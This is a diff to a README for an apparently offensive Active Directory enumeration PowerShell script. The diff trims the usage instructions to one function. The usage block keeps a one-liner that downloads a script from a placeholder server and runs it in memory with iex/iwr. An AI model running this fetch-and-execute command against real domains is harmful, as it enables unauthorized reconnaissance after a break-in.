@@ -14,12 +14,10 @@ It is to be used as an all-in-one enumeration script to use when you are in a do
 Big credits to all the authors of the above mentioned tools! You are awesome.
 
 ## How to use?
-If you are launching the script for the first time, the function ```Invoke-FullEnum``` is the recommended option as it will launch a full enumeration that will allow you to initially map the environment.\
-\
-From another domain user, the function ```Invoke-AdminEnum``` is recommended as it will launch only the relevant enumeration checks.
+The function ```Invoke-FullEnum``` will launch a full enumeration that will allow you to initially map the  AD environment.
+
 ```powershell
 iex(iwr -usebasicparsing http://[SERVER]/aden.ps1);Invoke-FullEnum
-iex(iwr -usebasicparsing http://[SERVER]/aden.ps1);Invoke-AdminEnum
 ```
 Keep in mind you also have access to all the functions of the above mentioned scripts. 
 
